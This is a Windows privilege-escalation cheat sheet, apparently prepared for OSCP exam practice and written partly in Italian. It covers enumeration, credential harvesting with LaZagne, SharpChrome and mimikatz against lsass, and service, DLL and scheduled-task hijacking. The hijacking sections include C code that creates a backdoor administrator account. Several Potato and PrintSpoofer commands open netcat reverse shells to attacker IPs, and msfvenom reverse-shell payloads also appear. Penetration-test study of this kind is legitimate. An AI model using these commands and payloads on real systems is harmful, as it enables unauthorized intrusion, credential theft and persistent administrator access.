# Manual Enumeration

## Operating Environment

```bash
# print system overview
systeminfo
Get-ComputerInfo

# check environment variables
set
Get-ChildItem Env:\
dir env:

# current user
whoami
whoami /all
whoami /groups
whoami /priv
```

- If in administrator group but still no access check [UAC](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/uac)
- [SeBackupPrivilege](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/sebackupprivilege) (VEDI GIU')
- [SeRestorePrivilege](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/serestoreprivilege) (VEDI GIU')
- **SeImpersonatePrivilege** ---> [GodPotato](https://github.com/BeichenDream/GodPotato), [Potatoes](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/potatoes)
- [SeDebugPrivilege](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/sedebugprivilege)
- [SeEnableDelegationPrivilege](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/seenabledelegationprivilege)
- [SeTakeOwnershipPrivilege](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/setakeownershipprivilege)
- [SeManageVolumePrivilege](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/semanagevolumeprivilege)
- [SeLoadDriverPrivilege](https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system
- [SeMachineAccountPrivilege](https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md)
- If you are **LOCAL SERVICE** or **NETWORK SERVICE** -> [FullPowers](https://github.com/itm4n/FullPowers), but I don't know if it is allowed by OSCP

### Users and Groups

```bash
# local user
net user
Get-LocalUser
# enumerate details about specific users
net user <username>
Get-LocalUser <username> | Select-Object *

# logged-in users
query user

# if there is C$ share
net use \\127.0.0.1\c$ /user:administrator "password"

# local groups
net localgroup
Get-LocalGroup
# enumerate details users of specific groups
net localgroup <group_name>
Get-LocalGroupMember <group_name> | Select-Object *

```

- [Print Operators]() group --> [SeLoadDriverPrivilege](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/seloaddriverprivilege) 
- [DnsAdmins](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/dnsadmins) group
- [Hyper-V Administrators](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/hyper-v-administrators) group
- [Server Operators](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/server-operators) group ([Return HTB](https://0xdf.gitlab.io/2022/05/05/htb-return.html#shell-as-svc-printer))
- [Event Log Readers](https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/windows-privesc-checklist) group
- [AD Recycle Bin](https://0xdf.gitlab.io/2020/07/25/htb-cascade.html#privesc-ssmith--arksvc) group (Cascade HTB)
- [Backup Operators]() group 

## Users and Groups (if domain-joined)

```bash
net user /domain
Get-ADUser -Filter * -Properties *

# enumerate details about specific domain users
net user <username> /domain
Get-ADUser -Identity <username> -Properties *

# Can you dump and pass/crack local user/admin hashses from SAM using your current access?

# Can you dump and pass/crack hashes from LSA using your current access?

net group /domain
Get-ADGroup -Filter * -Properties *

# enumerate members of specific domain groups
net group <group_name> /domain
Get-ADGroup -Identity <group_name> | Get-ADGroupMember -Recursive
```

- If not a local administrator and can't run PowerShell AD cmdlets -> check [this](https://notes.benheater.com/books/active-directory/page/powershell-ad-module-on-any-domain-host-as-any-user)

## Network Configurations

```bash
# Network Interfaces
ipconfig
ipconfig /all
Get-NetAdapter

# Open Ports
netstat -ano | findstr /i listening
Get-NetTCPConnection -State Listen

# ARP Table (if pivoting to other hosts)
arp -a
Get-NetNeighbor

# Routes (if pivoting to other hosts)
route print
Get-NetRoute

# Check if anyone else is logged in
qwinsta
```

## Processes, Services and Programs

```bash
# Installed Programs
wmic product get name
Get-WmiObject -Class Win32_Product |  select Name, Version
dir "C:\Program Files"
dir "C:\Program Files (x86)"
## POWERSHELL COMMAND
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

# Processes
tasklist
Get-Process

Get-CimInstance -ClassName Win32_Process | Select-Object Name, @{Name = 'Owner' ; Expression = {$owner = $_ | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue ; if ($owner.ReturnValue -eq 0) {$owner.Domain + '\' + $owner.User}}}, CommandLine | Sort-Object Owner | Format-List
'
# Interesting Services
netstat -ano
tasklist /FI "PID eq <PID>"

# Enumerate services
sc.exe query
sc.exe qc <service-name>
Get-Service * | Select-Object Displayname,Status,ServiceName,Can*

# Running services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# List the configuration for any interesting services
Get-CimInstance -ClassName Win32_Service | Select-Object Name, StartName, PathName | Sort-Object Name | Format-List

get-service | ? {$_.DisplayName -like 'QUALCOSA_NEL_NOME*'}
```

## Scheduled Tasks

```bash
# Enumerate scheduled tasks
schtasks /QUERY /FO LIST /V | findstr /i /c:taskname /c:"run as user" /c:"task to run"

Get-CimInstance -Namespace Root/Microsoft/Windows/TaskScheduler -ClassName MSFT_ScheduledTask | Select-Object TaskName, @{Name = 'User' ; Expression = {$_.Principal.UserId}}, @{Name = 'Action' ; Expression = {($_.Actions.Execute + ' ' + $_.Actions.Arguments)}} | Format-List
```

## Credential Theft

### History Checks

```shell
Get-History
(Get-PSReadLineOption).HistorySavePath

$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
dir env:

dir /a:h
C:\Users\{NomeUtente}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

### Cmdkey Saved Credentials

The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password. This may help us either move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.

```shell
cmdkey /list
```

We can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console.

```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

### Clear-Text Password Storage in the Registry

```shell
# Windows AutoLogon
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

#Putty
## 1 enumerate 
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
## 2 look at the keys and values of the discovered session
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>

#Wi-fi Passwords
## 1 list out any wireless networks they have recently connected to
netsh wlan show profile
## 2 Retrieving Saved Wireless Passwords
netsh wlan show profile PROFILE_NAME key=clear
```

### LaZagne

Running the tool with `all` will search for supported applications and return any discovered cleartext credentials.

- https://github.com/AlessandroZ/LaZagne/releases/tag/v2.4.6

```powershell
.\lazagne.exe all
```

### Browser Credentials

Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

```powershell-session
.\SharpChrome.exe logins /unprotect
```

### SessionGopher

We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials.

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

### Sticky Notes Passwords

People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file.

```powershell
cd "C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState"
```

We can copy the **plum.sqlite** files down to our system (KALI) and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the **Text** column in the **Note** table with the query **select Text from Note;**.

## Search for Interesting Files

```bash
# Ricerca di file interessanti
powershell tree /f
powershell tree /f C:\Users\

Get-ChildItem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem . -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Include ".git" -Recurse

Get-ChildItem -Path C:\ -Include proof.txt, local.txt -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\username\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\ -Include *.zip, *.xml,*.pdf,*.xls,*.xlsx,*.doc,*.docx, *.ini, *.cfg, *.config, *.xml -File -Recurse -ErrorAction SilentlyContinue

# Ricerca di password all'interno di file di diverso tipo
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# Altri file interessanti
Get-ChildItem -Path C:\Users\ -Include *.vmdk, *.vdhx, *.ppk, *.rdp, *.cred -File -Recurse -ErrorAction SilentlyContinue

# Get Perimissions
icacls auditTracker.exe
```
## Other Checks

```bash
# Check $PATH variable for current user for possible interesting locations
PATH
$env:path

# Check AlwaysInstallElevated Registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# if returns with `0x1` make an MSI, it'll run as SYSTEM (VEDERE PARAGRAFO)

## Check hidden files
attrib
dir c:\path\*.*
gci c:\path -Force

## credentials research
reg query HKLM /f password /t REG_SZ /s
## se si trova qualcosa, si puo capire a chi appartiene la password
reg query "HKEY..\..\..\."

# Check interesting folders
%SYSTEMDRIVE%\interesting_folder
%SYSTEMDRIVE%\Users\user_name
%SYSTEMDRIVE%\Windows\System32\drivers\etc\hosts
%SYSTEMDRIVE%\inetpub
%SYSTEMDRIVE%\Program Files\program_name
%SYSTEMDRIVE%\Program Files (x86)\program_name
%SYSTEMDRIVE%\ProgramData
%SYSTEMDRIVE%\Temp
%SYSTEMDRIVE%\Windows\Temp
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*

# Check for HiveNightmare vulnerability (VEDERE PARAGRAFO NOTABLE VULN.)
icacls c:\Windows\System32\config\SAM

## Modifica dei permessi su un file
icacls root.txt /grant username:F

# Runas
runas /user:utente cmd
runas /user:administrator "C:\...\nc.exe -e cmd.exe $IP PORT"
# esempio utente di dominio
runas /netonly /user:INLANEFREIGHT\adunn powershell

# RunasCs
.\RunasCs.exe username cmd

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Enumerating Protections 
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Enumerating Missing Patches (VEDERE PARAGRAFO NOTABLE VULN.)
systeminfo
wmic qfe list brief
Get-Hotfix
Get-HotFix | ft -AutoSize
```

## Hidden in Plain View

```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\username\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

pass
```

## Information Goldmine PowerShell

```bash
Get-History

(Get-PSReadlineOption).HistorySavePath
```

# Automated Enumeration

```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

python3 -m http.server 80

powershell iwr -uri http://$MIO_IP:9999/windows/winPEASx64.exe -Outfile winPEAS.exe .\winPEAS.exe

powershell iwr -uri http://$MIO_IP:9999/windows/Seatbelt.exe -Outfile Seatbelt.exe .\Seatbelt.exe -group=all

# If the result for Windows doesn't display colors, add this REG value
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

# PrivescCheck ([https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck))
iwr -uri http://192.168.45.159:1337/privesccheck.ps1 -Outfile privesccheck.ps1
. .\privesccheck.ps1
Invoke-PrivescCheck -Extended -Report "privesccheck_$($env:COMPUTERNAME)"
```

# Leveraging Windows Services
## Service Binary Hijacking

### 1. Search for vulnerable services

#### Manual approach

Search for running services.

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Search for services that are started when the system boots.

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

#### Automated approach
##### PowerUp

[PowerUp](https://github.com/BlessedRebuS/OSCP-Pentesting-Cheatsheet/blob/main/README.md#enumeration-1) is a tool that allows you to automate the search and exploitation of vulnerable services.

**IMPORTANT**: It is worth using this tool to support manual analysis.

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .

python3 -m http.server 80

iwr -uri http://$MIO_IP/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass

. .\PowerUp.ps1

# Search for services that can be modified by the user
Get-ModifiableServiceFile
```

```bash
Install-ServiceBinary -Name 'mysql'
```

```bash
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal

$ModifiableFiles

$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal

$ModifiableFiles

$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal

$ModifiableFiles
```

##### SharpUp

**IMPORTANT**: It is worth using this tool to support manual analysis.

**SharpUp** (GhostPack) also allows you to identify potentially vulnerable services.

```powershell
.\SharpUp.exe audit
```

### 2. Checking Permissions

Using **icalcls** to check permissions on a given file.

```bash
icacls "C:\...\file.exe"
```

|MASK|PERMISSIONS|
|---|---|
|F|Full access|
|M|Modify access|
|RX|Read and execute access|
|R|Read-only access|
|W|Write-only access|

An alternative to **icacls** is **accesschk**:

```powershell
accesschk.exe /accepteula -quvcw WindscribeService
```

### 3. Replacing Service Binary

One way to exploit elevated privileges on a given service is to make a copy of the original file and replace it with a malicious file generated by **msfvenom** or created manually. This way it is possible to get a reverse-shell on the machine, add a new user with elevated privileges or increase the privileges of the current user.

#### Adding a new user

Creating **adduser.c** file on kali to add a new user on the victim machine.

```bash
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user nuovo_utente password123! /add");
  i = system ("net localgroup administrators nuovo_utente /add");
  
  return 0;
}
```

Compiling the file on kali and transferring it to the victim machine.

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

python3 -m http.server 80

powershell 
iwr -uri http://$MIO_IP/adduser.exe -Outfile adduser.exe
move C:\..\path_del_file_con_privilegi_elevati\nomefile.exe nomefile.exe
move .\adduser.exe C:\..\path_del_file_con_privilegi_elevati\nomefile.exe
```

#### Adding the current user to the administrators group

```cmd-session
sc config WindscribeService binpath="cmd /c net localgroup administrators current_user /add"
```

### 4. Restarting the service

For the file to be executed, the service must be **stopped** and **restarted**.

```bash
sc.exe stop Service_Name
sc.exe start Service_Name

# or

net stop Service_Name
net start Service_Name
```

In the case of mysql, we may not have permission to stop the running service. To work around this, we may want to check if the **Startup Type** of the service is set to **Auto**. In this case, we may be able to restart the service by rebooting the system.

```bash
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

For a user to perform a reboot, they must have the **SeShutDownPrivilege** privilege.

```bash
whoami /priv
```

If we do not have the privileges to perform the reboot we can proceed in two ways:
- wait for the service to be restarted by others
- or perform a shutdown

**IMPORTANT**: performing a shutdown is not always the best choice!

```bash
shutdown /r /t 0
```

After rebooting you need to verify that the new user has been added.

```bash
Get-LocalGroupMember administrators
```

If the user is in this group the attack was successful and tools like **RunAs** or **msfvenom** can be used to obtain a shell for the new user.

```bash
runas /user:nuovo_utente cmd
password123!
```

## Service DLL Hijacking

**DLL injection** attack consists of inserting a piece of code, structured as a **Dynamic Link Library (DLL)**, into a running process. This technique allows the malicious piece of code to be executed within the context of the process, influencing its behavior or accessing its resources.

There are several ways to exploit this technique, one of which is **DLL Hijacking**.

**DLL Hijacking** is a technique that allows an attacker to exploit the loading process of a Windows DLL. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application does not specify the full path to a required DLL, making it susceptible to such attacks.

Enumeration of running services:

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

**IMPORTANT**: Most of the time this attack involves those services that have the executable located in folders accessible to the user, if not even in their own directory.

Check permissions of a binary file linked to a specific service:

```bash
icacls .\Documents\servizio.exe
```

**Procmon64.exe** can be used to inspect the service. Normally this can only be started with administrator privileges, so you usually transfer the service binary to your own machine and inspect it from there.

Once **Procmon64.exe** is started, you need to filter based on the service to inspect.

Then you need to restart the service:

```bash
Restart-Service servizio
```

In the case analyzed, it was noted the presence of several _CreateFile_ type operations connected to a _ddl_ that was not found.

To **hijack** the _DLL search order_ you need to keep in mind the Windows standard for searching for a dll linked to an executable:

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

In the case analyzed, the service searched (failing) for a file called _myDLL.dll_. In order to exploit this behavior, a malicious DLL was placed inside the user's documents folder, since (due to the standard) it is the second folder where the system looks for the dll and it was **overwritable** by the user.

```text
Each DLL can have an optional entry-point function called DllMain, which is executed when a process or thread attaches to the DLL.

This function generally contains 4 cases _DLL_PROCESS_ATTACH_, _DLL_THREAD_ATTACH_, _DLL_THREAD_DETACH_, _DLL_PROCESS_DETACH_.

These cases handle situations where the DLL is loaded or unloaded by a process or thread. They are commonly used to perform initialization tasks for the DLL or tasks related to exiting the DLL.

If a DLL does not have a DllMain entry point function, it only provides resources.
```

Below is a dll that allows you to create an administrator user:

```bash
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Compiling on kali:

```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

Transfer to Windows:

```bash
python3 -m http.server 8080

cd Documents
iwr -uri http://$KALI_IP/myDLL.dll -Outfile myDLL.dll
```

Restarting the service:

```bash
Restart-Service BetaService
```

New user creation check:

```bash
net localgroup administrators
```

## Unquoted Service Paths

If the path of an executable file contains one or more spaces and is not enclosed in quotes, then it could be used to escalate privileges.
This type of attack is mostly exploited when you have write permissions in the folder related to the executable file but you cannot modify the file itself.

When a process is started, the **CreateProcess** function is used. If the path string contains spaces, it can be interpreted in various ways:

```text
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

### 1. Search for vulnerable services

#### Manual approach

General list of services.

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

Targeted enumeration to find potentially vulnerable paths.

```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows\\" 
```

Search for services that are started when the system boots.

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

#### Automated approach
##### PowerUp

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
iwr -uri http://$MIO_IP/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
```

### 2. Execution of the attack

#### Manual approach

First of all, you need to check that it is possible to start and stop the service.

```bash
icacls "C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe"
```

Next, you need to identify the type of permissions you have on the folders connected to it.

```bash
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```

Once you have identified the right place to insert the malicious file, you can proceed with loading that file. You need to name this file with the right name, in this case **Current.exe**, as you have write permissions in the **"C:\Program Files\Enterprise Apps"** folder:

```bash
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

In this case, a file is created that allows you to add a user to the administrators group. Alternatively, you can upload a file generated by **msfvenom** to get a reverse-shell.

```bash
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user nuovo_utente password123! /add");
  i = system ("net localgroup administrators nuovo_utente /add");
  
  return 0;
}
```

This file is compiled on kali and passed to the victim machine:

```bash
x86_64-w64-mingw32-gcc Current.c -o Current.exe

python3 -m http.server 80

cd C:\\path_dove_caricare_il_file\..
iwr -uri http://$KALI_IP/Current.exe -Outfile Current.exe
```

#### Automated approach
##### PowerUp

```bash
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

### 3. Riavvio del servizio

For the file to be executed, a **restart** of the service is required.

```bash
Start-Service Service_Name

# or

sc.exe stop Service_Name
sc.exe start Service_Name

# or

net stop Service_Name
net start Service_Name
```

New user creation check:

```bash
net localgroup administrators
```

# Abusing Other Windows Components

## Scheduled Tasks

If you could find an automated task that runs in a higher-privileged context, you could exploit it to escalate your own privileges.

```bash
schtasks /query /fo LIST /v
Get-ScheduledTask
```

The important fields to check are:
- _Author_
- _TaskName_
- _Task To Run_
- _Run As User_
- _Next Run Time_

We can also use findstr if we want to search for something specific.

Once you find a suitable task you need to change the code with a malicious one like this:

```bash
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user nuovo_utente password123! /add");
  i = system ("net localgroup administrators nuovo_utente /add");
  
  return 0;
}
```

As always we compile it on kali and pass it to windows:

```bash
x86_64-w64-mingw32-gcc eseguibile.c -o eseguibile.exe

python3 -m http.server 80

cd C:\\path_dove_caricare_il_file\..

iwr -uri http://$KALI_IP/eseguibile.exe -Outfile eseguibile.exe
```

**IMPORTANT**: An executable may also be created with msfvenom:

```bash
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=$IP LPORT=3389 -f exe -a x64 --platform windows -b '\x00' -e x64\xor_dynamic -o nomefile.exe
```

## Using Exploits

Some privileges assigned to a non-privileged user could be exploited to perform privilege escalation:
- _SeImpersonatePrivilege_
- _SeBackupPrivilege_
- _SeAssignPrimaryToken_
- _SeLoadDriver_
- _SeDebug_

#### SeImpersonatePrivilege

It is very rare to find users with _SeImpersonatePrivilege_ enabled, but it is common to find it when getting *code execution* on a Windows system by exploiting a vulnerability on an IIS web-server.

In fact, IIS web-servers are often running as _LocalService_, _LocalSystem_, _NetworkService_, or _ApplicationPoolIdentity_, which may have _SeImpersonatePrivilege_ assigned.

Named-pipes are connected to _SeImpersonatePrivilege_ and are a method for local or remote inter-process communication. When a client connects to a named-pipe, the server can use _SeImpersonatePrivilege_ to impersonate the client after acquiring authentication from the connecting process.

So, by finding a suitable process, this can be exploited by making it connect to a named-pipe controlled by us.

To check user privileges:

```bash
whoami /priv
```

##### [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)

```bash
# 1 Alternativa
.\PrintSpoofer64.exe -i -c powershell.exe

# 2 Alternativa (nc.exe)
.\PrintSpoofer64.exe -c "C:\programdata\nc.exe 172.16.7.240 1337 -e cmd"
```

##### [Potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

- [SweetPotato](https://github.com/uknowsec/SweetPotato/blob/master/README.md)
- GodPotato
- [JucyPotato](https://github.com/ohpe/juicy-potato/releases)
	- [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)
	- 

```bash
# SweetPotato

.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"
```

```bash
# GodPotato

# Capire la versione da scaricare (NET35, NET4, NET2)
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

# 1 Alternativa - esecuzione comando
.\GodPotato.exe -cmd "whoami"

# 2 Alternativa - GodPotato con reverse-shell msfvenom
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.3 lport=1234 -f exe > shell124.exe # da kali
nc -nlvp 1234 # da kali
.\GodPotato.exe -cmd "C:\programdata\shell124.exe"

# 3 Alternativa - Aggiunta utente al gruppo administrator
.\GodPotato.exe -cmd "net user /add backdoor Password123"
.\GodPotato.exe -cmd "net localgroup administrators /add backdoor"
# successivamente ricavare reverse-shell tramite RunasCs.exe
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.3 lport=1234 -f exe > shell124.exe # da kali
nc -nlvp 1234 # da kali
.\RunasCs.exe backdoor Password123 "C:\programdata\shell124.exe" --force-profile --logon-type 8
```

```bash
# JuicyPotato

# 1 Alternativa
.\JuicyPotato.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *

# 2 Alternativa - con CLSID wuauserv
.\JuicyPotato.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\programdata\nc.exe -e cmd.exe 192.168.45.154 242" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

# 2 Alternativa - con CLSID recuperato tramite GetCLSID.ps1
.\GetCLSID.ps1
.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\programdata\nc.exe -e cmd.exe 192.168.45.154 242" -t * -c <CLSID HERE>
```

- [ADITYA Checklist](https://warranty-v01d.pages.dev/posts/how-i-passed-the-oscp/)

#### SeRestorePrivilege

- [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#serestoreprivilege)

Find the file _Utilman.exe_ inside the directory "C:\Windows\system32".

Rename the file:

```bash
ren Utilman.exe Utilman.old
ren cmd.exe Utilman.exe
```

Connect via rdp:

```bash
rdesktop $IP
```

Press windows + u to start a CMD session as NT authority/system.

#### SeManageVolumeExploit

- [Esempio macchina su Proving Groung](https://systemweakness.com/proving-grounds-practise-active-directory-box-access-79b1fe662f4d)
- https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public

#### SeBackupPrivilege

- [Esempio macchina HTB](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html)
- https://github.com/giuliano108/SeBackupPrivilege

Copying SAM and SYSTEM files to temp folder:

```bash
reg save hklm\sam c:\Temp\sam  
reg save hklm\system c:\Temp\system
```

Transferring files to kali machine and using impacket-secretsdump:

```bash
impacket-secretsdump -system system -sam sam local
```

#### SeDebugPrivilege

- [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
- [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)

```bash
iwr -uri http://$KALI_IP:9999/windows/procdump/procdump.exe -Outfile procdump.exe
iwr -uri http://$KALI_IP:9999/windows/procdump/procdump64.exe -Outfile procdump.exe

procdump.exe -accepteula -ma lsass.exe lsass.dmp

.\mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

#### SeTakeOwnershipPrivilege

[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor. Administrators are assigned this privilege by default.

Download script from [here](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)

